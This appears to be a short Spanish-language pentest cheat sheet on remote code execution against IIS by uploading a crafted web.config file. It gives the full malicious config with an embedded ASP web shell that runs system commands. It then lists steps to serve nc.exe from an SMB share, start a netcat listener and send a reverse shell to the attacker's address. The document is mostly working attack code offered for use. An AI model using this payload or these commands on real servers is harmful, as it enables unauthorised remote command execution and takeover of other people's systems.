** RCE by uploading a web.config file **
https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

``` XML

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd.exe /c whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>

```

Ganar acceso al sistema:
* En local: 
	* Crear un servidor SMB desde el que compartir 'nc.exe' para poder recibir una reverse shell.
	* `impacket-smbserver smbFolder $(pwd) -smb2support`
	* Poner en escucha un puerto con netcat donde recibir la reverse shell.
	* `rlwrap nc -nlvp 443`
	* Retocar fichero web.config con un comando para hacer uso de nc.exe y mandar una reverse shell.
	* `cmd.exe /c \\10.10.16.9\smbFolder\nc.exe -e cmd 10.10.16.9 443`
	* Subir fichero web.config al servidor vulnerable.
	* Apuntar al fichero subido.
	* `http://<sevidor_vulnerable>/UploadedFiles/web.config`
	* Recibiremos una reverse shell. 